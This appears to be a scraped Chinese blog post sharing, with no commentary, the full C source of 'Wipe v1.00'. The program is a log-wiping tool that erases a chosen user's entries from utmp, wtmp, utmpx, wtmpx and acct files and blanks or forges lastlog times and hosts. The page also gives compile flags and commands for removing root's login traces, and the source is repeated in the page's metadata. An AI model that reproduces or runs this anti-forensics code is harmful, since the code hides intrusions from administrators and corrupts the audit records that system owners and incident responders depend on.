	fflush(stdout);
		
	/*
	 * Open the utmp file and temporary file.
	 */
	if ( (fd1 = open(UTMPX_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", UTMPX_FILE);
		return;
	}

	while ( (read(fd1, &amp;utx, sizeof(utx)) ) > 0) 
		if ( !strncmp(utx.ut_name, who, strlen(who)) )
			if (!line || (line && 
			  !strncmp(utx.ut_line, line, strlen(line)))) {
				bzero((char *) &amp;utx, sizeof(utx));
				lseek(fd1, (int) -sizeof(utx), SEEK_CUR);
				write(fd1, &amp;utx, sizeof(utx));
			}

	close(fd1);

	printf("Done.\n");
}
#endif


/*
 * WTMP editing.
 */
void
wipe_wtmp(char *who, char *line)
{
	int		fd1;
	struct utmp	ut;

	printf("Patching %s .... ", WTMP_FILE);
	fflush(stdout);
	
        /*
	 * Open the wtmp file and temporary file.
	 */
	if ( (fd1 = open(WTMP_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", WTMP_FILE);
		return;
	}

	/*
	 * Determine offset of last relevent entry.
	 */
	lseek(fd1, (long) -(sizeof(ut)), SEEK_END);
	while ( (read (fd1, &amp;ut, sizeof(ut))) > 0) {
		if (!strncmp(ut.ut_name, who, strlen(who)))
			if (!line || (line && 
			  !strncmp(ut.ut_line, line, strlen(line)))) {
			  	bzero((char *) &amp;ut, sizeof(ut));
				lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR);
			  	write(fd1, &amp;ut, sizeof(ut));
			  	break;
			}
		lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR);
	}

	close(fd1);
	
	printf("Done.\n");
}


/*
 * WTMPX editing if supported.
 */
#ifdef HAVE_UTMPX
void
wipe_wtmpx(char *who, char *line)
{
	int 		fd1;
	struct utmpx	utx;
	
	printf("Patching %s .... ", WTMPX_FILE);
	fflush(stdout);
	
	/*
	 * Open the utmp file and temporary file.
	 */
	if ( (fd1 = open(WTMPX_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", WTMPX_FILE);
		return;
	}

	/*
	 * Determine offset of last relevent entry.
	 */
	lseek(fd1, (long) -(sizeof(utx)), SEEK_END);
	while ( (read (fd1, &amp;utx, sizeof(utx))) > 0) {
		if (!strncmp(utx.ut_name, who, strlen(who)))
			if (!line || (line && 
			  !strncmp(utx.ut_line, line, strlen(line)))) {
			  	bzero((char *) &amp;utx, sizeof(utx));
				lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR);
			  	write(fd1, &amp;utx, sizeof(utx));
			  	break;
			}
		lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR);
	}

	close(fd1);

	printf("Done.\n");
}
#endif


/*
 * LASTLOG editing.
 */
void
wipe_lastlog(char *who, char *line, char *timestr, char *host)
{
	int		fd1;
	struct lastlog	ll;
	struct passwd	*pwd;
	struct tm	*tm; 
	char		str[4];

	printf("Patching %s .... ", LASTLOG_FILE);
	fflush(stdout);

	tm = (struct tm *) malloc( sizeof(struct tm) );
	
        /*
	 * Open the lastlog file.
	 */
	if ( (fd1 = open(LASTLOG_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", LASTLOG_FILE);
		return;
	}

	if ( (pwd = getpwnam(who)) == NULL) {
		fprintf(stderr, "ERROR: Can&#39;t find user in passwd.\n");
		return;
	}
	
	lseek(fd1, (long) pwd->pw_uid * sizeof(struct lastlog), 0);
	bzero((char *) &amp;ll, sizeof(ll));

	if (line) 
		strncpy(ll.ll_line, line, strlen(line));

	if (timestr) {
		/* YYMMddhhmm */
		if (strlen(timestr) != 10) {
			fprintf(stderr, "ERROR: Time format is YYMMddhhmm.\n");
			return;
		}
		
		/*
		 * Extract Times.
		 */
		str[2] = 0;
		str[0] = timestr[0];
		str[1] = timestr[1];
		tm->tm_year = atoi(str);
		
		str[0] = timestr[2];
		str[1] = timestr[3];
		tm->tm_mon = atoi(str) - 1;
		
		str[0] = timestr[4];
		str[1] = timestr[5];
		tm->tm_mday = atoi(str);
		
		str[0] = timestr[6];
		str[1] = timestr[7];
		tm->tm_hour = atoi(str);
		
		str[0] = timestr[8];
		str[1] = timestr[9];
		tm->tm_min = atoi(str);
		tm->tm_sec = 0;
		
		ll.ll_time = mktime(tm);
	}

	if (host)
		strncpy(ll.ll_host, host, sizeof(ll.ll_host));
	

	write(fd1, (char *) &amp;ll, sizeof(ll));

	close(fd1);

	printf("Done.\n");
}


#ifndef NO_ACCT
/*
 * ACCOUNT editing.
 */
void
wipe_acct(char *who, char *line)
{    
	int		fd1, fd2;
	struct acct	ac;
	char		ttyn[50];
	struct passwd   *pwd;
	struct stat	sbuf;
	char		*tmpf;
	
	printf("Patching %s .... ", ACCT_FILE);
	fflush(stdout);

        /*
	 * Open the acct file and temporary file.
	 */
	if ( (fd1 = open(ACCT_FILE, O_RDONLY)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", ACCT_FILE);
		return;
	}

	/*
	 * Grab a unique temporary filename.
	 */
	tmpf = tmpnam((char *) NULL);

	if ( (fd2 = open(tmpf, O_WRONLY | O_CREAT | O_TRUNC, 600)) < 0 ) {
		fprintf(stderr, "ERROR: Opening tmp ACCT file\n");
		return;
	}

	if ( (pwd = getpwnam(who)) == NULL) {
		fprintf(stderr, "ERROR: Can&#39;t find user in passwd.\n");
		return;
	}

	/*
	 * Determine tty&#39;s device number
	 */
	strcpy(ttyn, "/dev/");
	strcat(ttyn, line);
	if (stat(ttyn, &amp;sbuf) < 0) {
		fprintf(stderr, "ERROR: Determining tty device number.\n");
		return;
	}
	
	while ( read(fd1, &amp;ac, sizeof(ac)) > 0 ) {
		if ( !(ac.ac_uid == pwd->pw_uid && ac.ac_tty == sbuf.st_rdev) )	
			write(fd2, &amp;ac, sizeof(ac));
	}

	close(fd1);
	close(fd2);
	
	copy_file(tmpf, ACCT_FILE);
	
	if ( unlink(tmpf) < 0 ) {
		fprintf(stderr, "ERROR: Unlinking tmp WTMP file.\n");
		return;
	}

	printf("Done.\n");
} 
#endif


void
usage()
{
	printf("USAGE: wipe [ u|w|l|a ] ...options...\n");
	printf("\n");
	printf("UTMP editing:\n");
	printf("    Erase all usernames      :   wipe u [username]\n");
	printf("    Erase one username on tty:   wipe u [username] [tty]\n");
	printf("\n");
	printf("WTMP editing:\n");
	printf("   Erase last entry for user :   wipe w [username]\n");
	printf("   Erase last entry on tty   :   wipe w [username] [tty]\n");
	printf("\n");	
	printf("LASTLOG editing:\n");
	printf("   Blank lastlog for user    :   wipe l [username]\n");
	printf("   Alter lastlog entry       :   wipe l [username] [tty] [time] [host]\n");
	printf("	Where [time] is in the format [YYMMddhhmm]\n");
	printf("\n");
#ifndef NO_ACCT
	printf("ACCT editing:\n");
	printf("   Erase acct entries on tty :   wipe a [username] [tty]\n");
#endif
	exit(1);
}


int
main(int argc, char *argv[])
{
	char	c;
	
	if (argc < 3)
		usage();

	/*
	 * First character of first argument determines which file to edit.
	 */
	c = toupper(argv[1][0]);
	
	/*
	 * UTMP editing.
	 */
	switch (c) {
		/* UTMP */
		case &#39;U&#39; :
			if (argc == 3)
				wipe_utmp(argv[2], (char *) NULL);
			if (argc ==4)
				wipe_utmp(argv[2], argv[3]);
			
#ifdef HAVE_UTMPX
			if (argc == 3)
				wipe_utmpx(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_utmpx(argv[2], argv[3]);
#endif
			
			break;
		/* WTMP */
		case &#39;W&#39; :
			if (argc == 3)
				wipe_wtmp(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_wtmp(argv[2], argv[3]);
			
#ifdef HAVE_UTMPX
			if (argc == 3)
				wipe_wtmpx(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_wtmpx(argv[2], argv[3]);
#endif
			
			break;
		/* LASTLOG */
		case &#39;L&#39; :
			if (argc == 3)
				wipe_lastlog(argv[2], (char *) NULL, 
					(char *) NULL, (char *) NULL);
			if (argc == 4)
				wipe_lastlog(argv[2], argv[3], (char *) NULL,
						(char *) NULL);
			if (argc == 5)
				wipe_lastlog(argv[2], argv[3], argv[4], 
						(char *) NULL);
			if (argc == 6)
				wipe_lastlog(argv[2], argv[3], argv[4], 
						argv[5]);
			break;
#ifndef NO_ACCT
		/* ACCT */
		case &#39;A&#39; :
			if (argc != 4)
				usage();
			wipe_acct(argv[2], argv[3]);
			break;
#endif
	}

	return(0);
}
'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"所有文章","item":"https://rendoumi.com/posts/"},{"@type":"ListItem","position":2,"name":"Linux下的擦除工具","item":"https://rendoumi.com/posts/20240129-wipe_linux/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Linux下的擦除工具","name":"Linux下的擦除工具","description":"Linux下的日志擦除软件，无解释珍藏：\ngcc -O3 -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c wipe u root #w 命令擦掉在线的root wipe w root #last 命令擦掉root wipe l root #lastlog 命令擦掉root登录记录 源码如下：\n/* * Wipe v1.00. * * Written by The Crawler. * * Selectively wipe system logs. * * Usage: wipe [l,u,w] username * ex: wipe l user;wipe u user;wipe w user * * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x, * Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX. * compile with -DHAVE_LASTLOG_H -DNO_ACCT */ #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #ifndef NO_ACCT #include \u0026lt;sys/acct.h\u0026gt; #endif #include \u0026lt;utmp.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;pwd.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #ifdef HAVE_LASTLOG_H #include \u0026lt;lastlog.h\u0026gt; #endif #ifdef HAVE_UTMPX #include \u0026lt;utmpx.h\u0026gt; #endif /* * Try to use the paths out of the include files. * But if we can\u0026#39;t find any, revert to the defaults. */ #ifndef UTMP_FILE #ifdef _PATH_UTMP #define UTMP_FILE\t_PATH_UTMP #else #define UTMP_FILE\t\u0026#34;/var/adm/utmp\u0026#34; #endif #endif #ifndef WTMP_FILE #ifdef _PATH_WTMP #define WTMP_FILE\t_PATH_WTMP #else #define WTMP_FILE\t\u0026#34;/var/adm/wtmp\u0026#34; #endif #endif #ifndef LASTLOG_FILE #ifdef _PATH_LASTLOG #define LASTLOG_FILE\t_PATH_LASTLOG #else #define LASTLOG_FILE\t\u0026#34;/var/adm/lastlog\u0026#34; #endif #endif #ifndef ACCT_FILE #define ACCT_FILE\t\u0026#34;/var/adm/pacct\u0026#34; #endif #ifdef HAVE_UTMPX #ifndef UTMPX_FILE #define UTMPX_FILE\t\u0026#34;/var/adm/utmpx\u0026#34; #endif #ifndef WTMPX_FILE #define WTMPX_FILE\t\u0026#34;/var/adm/wtmpx\u0026#34; #endif #endif /* HAVE_UTMPX */ #define BUFFSIZE\t8192 /* * This function will copy the src file to the dst file. */ void copy_file(char *src, char *dst) { int fd1, fd2; int\tn; char\tbuf[BUFFSIZE]; if ( (fd1 = open(src, O_RDONLY)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s during copy.\\n\u0026#34;, src); return; } if ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Creating %s during copy.\\n\u0026#34;, dst); return; } while ( (n = read(fd1, buf, BUFFSIZE)) \u0026gt; 0) if (write(fd2, buf, n) != n) { fprintf(stderr, \u0026#34;ERROR: Write error during copy.\\n\u0026#34;); return; } if (n \u0026lt; 0) { fprintf(stderr, \u0026#34;ERROR: Read error during copy.\\n\u0026#34;); return; } close(fd1); close(fd2); } /* * UTMP editing. */ void wipe_utmp(char *who, char *line) { int fd1; struct utmp\tut; printf(\u0026#34;Patching %s .... \u0026#34;, UTMP_FILE); fflush(stdout); /* * Open the utmp file. */ if ( (fd1 = open(UTMP_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, UTMP_FILE); return; } /* * Copy utmp file excluding relevent entries. */\twhile ( read(fd1, \u0026amp;ut, sizeof(ut)) \u0026gt; 0) if ( !strncmp(ut.ut_name, who, strlen(who)) ) if (!line || (line \u0026amp;\u0026amp; !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;ut, sizeof(ut)); lseek(fd1, (int) -sizeof(ut), SEEK_CUR); write(fd1, \u0026amp;ut, sizeof(ut)); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } /* * UTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_utmpx(char *who, char *line) { int fd1; struct utmpx\tutx; printf(\u0026#34;Patching %s .... \u0026#34;, UTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(UTMPX_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, UTMPX_FILE); return; } while ( (read(fd1, \u0026amp;utx, sizeof(utx)) ) \u0026gt; 0) if ( !strncmp(utx.ut_name, who, strlen(who)) ) if (!line || (line \u0026amp;\u0026amp; !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;utx, sizeof(utx)); lseek(fd1, (int) -sizeof(utx), SEEK_CUR); write(fd1, \u0026amp;utx, sizeof(utx)); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } #endif /* * WTMP editing. */ void wipe_wtmp(char *who, char *line) { int\tfd1; struct utmp\tut; printf(\u0026#34;Patching %s .... \u0026#34;, WTMP_FILE); fflush(stdout); /* * Open the wtmp file and temporary file. */ if ( (fd1 = open(WTMP_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, WTMP_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(ut)), SEEK_END); while ( (read (fd1, \u0026amp;ut, sizeof(ut))) \u0026gt; 0) { if (!strncmp(ut.ut_name, who, strlen(who))) if (!line || (line \u0026amp;\u0026amp; !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;ut, sizeof(ut)); lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR); write(fd1, \u0026amp;ut, sizeof(ut)); break; } lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } /* * WTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_wtmpx(char *who, char *line) { int fd1; struct utmpx\tutx; printf(\u0026#34;Patching %s .... \u0026#34;, WTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(WTMPX_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, WTMPX_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(utx)), SEEK_END); while ( (read (fd1, \u0026amp;utx, sizeof(utx))) \u0026gt; 0) { if (!strncmp(utx.ut_name, who, strlen(who))) if (!line || (line \u0026amp;\u0026amp; !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;utx, sizeof(utx)); lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR); write(fd1, \u0026amp;utx, sizeof(utx)); break; } lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } #endif /* * LASTLOG editing. */ void wipe_lastlog(char *who, char *line, char *timestr, char *host) { int\tfd1; struct lastlog\tll; struct passwd\t*pwd; struct tm\t*tm; char\tstr[4]; printf(\u0026#34;Patching %s .... \u0026#34;, LASTLOG_FILE); fflush(stdout); tm = (struct tm *) malloc( sizeof(struct tm) ); /* * Open the lastlog file. */ if ( (fd1 = open(LASTLOG_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, LASTLOG_FILE); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, \u0026#34;ERROR: Can\u0026#39;t find user in passwd.\\n\u0026#34;); return; } lseek(fd1, (long) pwd-\u0026gt;pw_uid * sizeof(struct lastlog), 0); bzero((char *) \u0026amp;ll, sizeof(ll)); if (line) strncpy(ll.ll_line, line, strlen(line)); if (timestr) { /* YYMMddhhmm */ if (strlen(timestr) != 10) { fprintf(stderr, \u0026#34;ERROR: Time format is YYMMddhhmm.\\n\u0026#34;); return; } /* * Extract Times. */ str[2] = 0; str[0] = timestr[0]; str[1] = timestr[1]; tm-\u0026gt;tm_year = atoi(str); str[0] = timestr[2]; str[1] = timestr[3]; tm-\u0026gt;tm_mon = atoi(str) - 1; str[0] = timestr[4]; str[1] = timestr[5]; tm-\u0026gt;tm_mday = atoi(str); str[0] = timestr[6]; str[1] = timestr[7]; tm-\u0026gt;tm_hour = atoi(str); str[0] = timestr[8]; str[1] = timestr[9]; tm-\u0026gt;tm_min = atoi(str); tm-\u0026gt;tm_sec = 0; ll.ll_time = mktime(tm); } if (host) strncpy(ll.ll_host, host, sizeof(ll.ll_host)); write(fd1, (char *) \u0026amp;ll, sizeof(ll)); close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } #ifndef NO_ACCT /* * ACCOUNT editing. */ void wipe_acct(char *who, char *line) { int\tfd1, fd2; struct acct\tac; char\tttyn[50]; struct passwd *pwd; struct stat\tsbuf; char\t*tmpf; printf(\u0026#34;Patching %s .... \u0026#34;, ACCT_FILE); fflush(stdout); /* * Open the acct file and temporary file. */ if ( (fd1 = open(ACCT_FILE, O_RDONLY)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, ACCT_FILE); return; } /* * Grab a unique temporary filename. */ tmpf = tmpnam((char *) NULL); if ( (fd2 = open(tmpf, O_WRONLY | O_CREAT | O_TRUNC, 600)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening tmp ACCT file\\n\u0026#34;); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, \u0026#34;ERROR: Can\u0026#39;t find user in passwd.\\n\u0026#34;); return; } /* * Determine tty\u0026#39;s device number */ strcpy(ttyn, \u0026#34;/dev/\u0026#34;); strcat(ttyn, line); if (stat(ttyn, \u0026amp;sbuf) \u0026lt; 0) { fprintf(stderr, \u0026#34;ERROR: Determining tty device number.\\n\u0026#34;); return; } while ( read(fd1, \u0026amp;ac, sizeof(ac)) \u0026gt; 0 ) { if ( !(ac.ac_uid == pwd-\u0026gt;pw_uid \u0026amp;\u0026amp; ac.ac_tty == sbuf.st_rdev) )\twrite(fd2, \u0026amp;ac, sizeof(ac)); } close(fd1); close(fd2); copy_file(tmpf, ACCT_FILE); if ( unlink(tmpf) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Unlinking tmp WTMP file.\\n\u0026#34;); return; } printf(\u0026#34;Done.\\n\u0026#34;); } #endif void usage() { printf(\u0026#34;USAGE: wipe [ u|w|l|a ] ...options...\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;UTMP editing:\\n\u0026#34;); printf(\u0026#34; Erase all usernames : wipe u [username]\\n\u0026#34;); printf(\u0026#34; Erase one username on tty: wipe u [username] [tty]\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;WTMP editing:\\n\u0026#34;); printf(\u0026#34; Erase last entry for user : wipe w [username]\\n\u0026#34;); printf(\u0026#34; Erase last entry on tty : wipe w [username] [tty]\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;);\tprintf(\u0026#34;LASTLOG editing:\\n\u0026#34;); printf(\u0026#34; Blank lastlog for user : wipe l [username]\\n\u0026#34;); printf(\u0026#34; Alter lastlog entry : wipe l [username] [tty] [time] [host]\\n\u0026#34;); printf(\u0026#34;\tWhere [time] is in the format [YYMMddhhmm]\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); #ifndef NO_ACCT printf(\u0026#34;ACCT editing:\\n\u0026#34;); printf(\u0026#34; Erase acct entries on tty : wipe a [username] [tty]\\n\u0026#34;); #endif exit(1); } int main(int argc, char *argv[]) { char\tc; if (argc \u0026lt; 3) usage(); /* * First character of first argument determines which file to edit. */ c = toupper(argv[1][0]); /* * UTMP editing. */ switch (c) { /* UTMP */ case \u0026#39;U\u0026#39; : if (argc == 3) wipe_utmp(argv[2], (char *) NULL); if (argc ==4) wipe_utmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_utmpx(argv[2], (char *) NULL); if (argc == 4) wipe_utmpx(argv[2], argv[3]); #endif break; /* WTMP */ case \u0026#39;W\u0026#39; : if (argc == 3) wipe_wtmp(argv[2], (char *) NULL); if (argc == 4) wipe_wtmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_wtmpx(argv[2], (char *) NULL); if (argc == 4) wipe_wtmpx(argv[2], argv[3]); #endif break; /* LASTLOG */ case \u0026#39;L\u0026#39; : if (argc == 3) wipe_lastlog(argv[2], (char *) NULL, (char *) NULL, (char *) NULL); if (argc == 4) wipe_lastlog(argv[2], argv[3], (char *) NULL, (char *) NULL); if (argc == 5) wipe_lastlog(argv[2], argv[3], argv[4], (char *) NULL); if (argc == 6) wipe_lastlog(argv[2], argv[3], argv[4], argv[5]); break; #ifndef NO_ACCT /* ACCT */ case \u0026#39;A\u0026#39; : if (argc != 4) usage(); wipe_acct(argv[2], argv[3]); break; #endif } return(0); } ","keywords":[],"articleBody":"Linux下的日志擦除软件，无解释珍藏：\ngcc -O3 -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c wipe u root #w 命令擦掉在线的root wipe w root #last 命令擦掉root wipe l root #lastlog 命令擦掉root登录记录 源码如下：\n/* * Wipe v1.00. * * Written by The Crawler. * * Selectively wipe system logs. * * Usage: wipe [l,u,w] username * ex: wipe l user;wipe u user;wipe w user * * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x, * Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX. * compile with -DHAVE_LASTLOG_H -DNO_ACCT */ #include #include #include #ifndef NO_ACCT #include #endif #include #include #include #include #include #include #include #include #include #ifdef HAVE_LASTLOG_H #include #endif #ifdef HAVE_UTMPX #include #endif /* * Try to use the paths out of the include files. * But if we can't find any, revert to the defaults. */ #ifndef UTMP_FILE #ifdef _PATH_UTMP #define UTMP_FILE\t_PATH_UTMP #else #define UTMP_FILE\t\"/var/adm/utmp\" #endif #endif #ifndef WTMP_FILE #ifdef _PATH_WTMP #define WTMP_FILE\t_PATH_WTMP #else #define WTMP_FILE\t\"/var/adm/wtmp\" #endif #endif #ifndef LASTLOG_FILE #ifdef _PATH_LASTLOG #define LASTLOG_FILE\t_PATH_LASTLOG #else #define LASTLOG_FILE\t\"/var/adm/lastlog\" #endif #endif #ifndef ACCT_FILE #define ACCT_FILE\t\"/var/adm/pacct\" #endif #ifdef HAVE_UTMPX #ifndef UTMPX_FILE #define UTMPX_FILE\t\"/var/adm/utmpx\" #endif #ifndef WTMPX_FILE #define WTMPX_FILE\t\"/var/adm/wtmpx\" #endif #endif /* HAVE_UTMPX */ #define BUFFSIZE\t8192 /* * This function will copy the src file to the dst file. */ void copy_file(char *src, char *dst) { int fd1, fd2; int\tn; char\tbuf[BUFFSIZE]; if ( (fd1 = open(src, O_RDONLY)) \u003c 0 ) { fprintf(stderr, \"ERROR: Opening %s during copy.\\n\", src); return; } if ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC)) \u003c 0 ) { fprintf(stderr, \"ERROR: Creating %s during copy.\\n\", dst); return; } while ( (n = read(fd1, buf, BUFFSIZE)) \u003e 0) if (write(fd2, buf, n) != n) { fprintf(stderr, \"ERROR: Write error during copy.\\n\"); return; } if (n \u003c 0) { fprintf(stderr, \"ERROR: Read error during copy.\\n\"); return; } close(fd1); close(fd2); } /* * UTMP editing. */ void wipe_utmp(char *who, char *line) { int fd1; struct utmp\tut; printf(\"Patching %s .... \", UTMP_FILE); fflush(stdout); /* * Open the utmp file. */ if ( (fd1 = open(UTMP_FILE, O_RDWR)) \u003c 0 ) { fprintf(stderr, \"ERROR: Opening %s\\n\", UTMP_FILE); return; } /* * Copy utmp file excluding relevent entries. */\twhile ( read(fd1, \u0026ut, sizeof(ut)) \u003e 0) if ( !strncmp(ut.ut_name, who, strlen(who)) ) if (!line || (line \u0026\u0026 !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) \u0026ut, sizeof(ut)); lseek(fd1, (int) -sizeof(ut), SEEK_CUR); write(fd1, \u0026ut, sizeof(ut)); } close(fd1); printf(\"Done.\\n\"); } /* * UTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_utmpx(char *who, char *line) { int fd1; struct utmpx\tutx; printf(\"Patching %s .... \", UTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(UTMPX_FILE, O_RDWR)) \u003c 0 ) { fprintf(stderr, \"ERROR: Opening %s\\n\", UTMPX_FILE); return; } while ( (read(fd1, \u0026utx, sizeof(utx)) ) \u003e 0) if ( !strncmp(utx.ut_name, who, strlen(who)) ) if (!line || (line \u0026\u0026 !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) \u0026utx, sizeof(utx)); lseek(fd1, (int) -sizeof(utx), SEEK_CUR); write(fd1, \u0026utx, sizeof(utx)); } close(fd1); printf(\"Done.\\n\"); } #endif /* * WTMP editing. */ void wipe_wtmp(char *who, char *line) { int\tfd1; struct utmp\tut; printf(\"Patching %s .... \", WTMP_FILE); fflush(stdout); /* * Open the wtmp file and temporary file. */ if ( (fd1 = open(WTMP_FILE, O_RDWR)) \u003c 0 ) { fprintf(stderr, \"ERROR: Opening %s\\n\", WTMP_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(ut)), SEEK_END); while ( (read (fd1, \u0026ut, sizeof(ut))) \u003e 0) { if (!strncmp(ut.ut_name, who, strlen(who))) if (!line || (line \u0026\u0026 !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) \u0026ut, sizeof(ut)); lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR); write(fd1, \u0026ut, sizeof(ut)); break; } lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR); } close(fd1); printf(\"Done.\\n\"); } /* * WTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_wtmpx(char *who, char *line) { int fd1; struct utmpx\tutx; printf(\"Patching %s .... \", WTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(WTMPX_FILE, O_RDWR)) \u003c 0 ) { fprintf(stderr, \"ERROR: Opening %s\\n\", WTMPX_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(utx)), SEEK_END); while ( (read (fd1, \u0026utx, sizeof(utx))) \u003e 0) { if (!strncmp(utx.ut_name, who, strlen(who))) if (!line || (line \u0026\u0026 !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) \u0026utx, sizeof(utx)); lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR); write(fd1, \u0026utx, sizeof(utx)); break; } lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR); } close(fd1); printf(\"Done.\\n\"); } #endif /* * LASTLOG editing. */ void wipe_lastlog(char *who, char *line, char *timestr, char *host) { int\tfd1; struct lastlog\tll; struct passwd\t*pwd; struct tm\t*tm; char\tstr[4]; printf(\"Patching %s .... \", LASTLOG_FILE); fflush(stdout); tm = (struct tm *) malloc( sizeof(struct tm) ); /* * Open the lastlog file. */ if ( (fd1 = open(LASTLOG_FILE, O_RDWR)) \u003c 0 ) { fprintf(stderr, \"ERROR: Opening %s\\n\", LASTLOG_FILE); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, \"ERROR: Can't find user in passwd.\\n\"); return; } lseek(fd1, (long) pwd-\u003epw_uid * sizeof(struct lastlog), 0); bzero((char *) \u0026ll, sizeof(ll)); if (line) strncpy(ll.ll_line, line, strlen(line)); if (timestr) { /* YYMMddhhmm */ if (strlen(timestr) != 10) { fprintf(stderr, \"ERROR: Time format is YYMMddhhmm.\\n\"); return; } /* * Extract Times. */ str[2] = 0; str[0] = timestr[0]; str[1] = timestr[1]; tm-\u003etm_year = atoi(str); str[0] = timestr[2]; str[1] = timestr[3]; tm-\u003etm_mon = atoi(str) - 1; str[0] = timestr[4]; str[1] = timestr[5]; tm-\u003etm_mday = atoi(str); str[0] = timestr[6]; str[1] = timestr[7]; tm-\u003etm_hour = atoi(str); str[0] = timestr[8]; str[1] = timestr[9]; tm-\u003etm_min = atoi(str); tm-\u003etm_sec = 0; ll.ll_time = mktime(tm); } if (host) strncpy(ll.ll_host, host, sizeof(ll.ll_host)); write(fd1, (char *) \u0026ll, sizeof(ll)); close(fd1); printf(\"Done.\\n\"); } #ifndef NO_ACCT /* * ACCOUNT editing. */ void wipe_acct(char *who, char *line) { int\tfd1, fd2; struct acct\tac; char\tttyn[50]; struct passwd *pwd; struct stat\tsbuf; char\t*tmpf; printf(\"Patching %s .... \", ACCT_FILE); fflush(stdout); /* * Open the acct file and temporary file. */ if ( (fd1 = 